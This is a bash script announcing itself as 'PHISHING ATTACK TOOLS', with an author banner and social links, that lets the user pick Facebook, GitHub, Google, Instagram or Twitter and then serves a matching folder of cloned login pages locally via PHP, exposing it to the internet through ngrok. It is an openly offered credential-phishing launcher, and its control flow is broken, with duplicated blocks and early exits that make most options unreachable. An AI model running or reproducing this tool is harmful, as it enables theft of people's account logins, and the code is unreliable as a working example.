#!/bin/bash

echo "WELCOME TO  PHISHING ATTACK TOOLS"
echo ' _   _    _     _   _   _       '
echo '| | / /  | |   / / | | | |      '
echo '| |/ /   | |  / /  | |_| |      '
echo '| |\ \   | | / /   \___  |      '
echo '| | \ \  | |/ /        | |      '
echo '|_|  \_\ |___/         |_| KV4 '      
echo '      ' 
echo 'Website ==> arasmamhoud.softr.app '
echo 'Instagram ==> almcompany6 ' 
echo 'Linkedin ==> almcompany '
echo 'Udemy ==> Arasmahmoud '
echo "    "
echo " [1] FACEBOOK"
echo " [2] GITHUB "
echo " [3] GOOGLE   "
echo " [4] INSTAGRAM   "
echo " [5] TWITTER  "
echo "       "

echo " select the number >> "
read n

if [ $n -eq 1 ];
then
	echo "please wait ...."
	sleep 0.5
	cd sites && cd facebook && php -S localhost:4444 & ./ngrok http 4444

fi 
	echo "try again .."
if [ $n -eq 2 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd github && php -S localhost:4444 & ./ngrok http 4444
fi
exit



echo "try again .."
if [ $n -eq 2 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd github && php -S localhost:4444 & ./ngrok http 4444
fi
exit

if [ $n -eq 3 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd google && php -S localhost:4444 & ./ngrok http 4444
fi
exit

if [ $n -eq 4 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd instgram && php -S localhost:4444 & ./ngrok http 4444
fi
exit
echo "try again .."
if [ $n -eq 5 ];
then
        echo "please wait ...."
        sleep 0.5
        cd sites && cd twitter && php -S localhost:4444 & ./ngrok http 4444
fi
exit
